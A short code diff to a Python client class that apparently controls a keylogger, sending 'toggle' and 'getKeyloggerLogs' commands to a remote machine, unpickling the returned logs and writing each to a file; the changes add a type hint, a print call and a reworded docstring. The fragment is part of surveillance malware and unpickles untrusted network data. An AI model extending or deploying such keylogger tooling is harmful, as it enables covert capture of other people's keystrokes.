@@ -71,9 +71,11 @@ class Client:
         # Toggling will be done client-side, technically server-side
         self.send("toggle")
 
-    def getKeyloggerOutput(self):
+        # Get status
+
+    def getKeyloggerOutput(self) -> list[str]:
         """
-        Returns a list containing the raw output of the keylogger
+        Writes all unpickled values into their respective files
         :return:
         """
         self.send("getKeyloggerLogs")
@@ -82,6 +84,7 @@ class Client:
         pickledlogs = pickle.loads(pickledlogs)
         # print(pickledlogs)
         for log in pickledlogs:
+            print(log[:12])
             with open(f"{MAINFOLDER}logs/{log[:12]}", "w+") as f:
                 f.write(log)
 
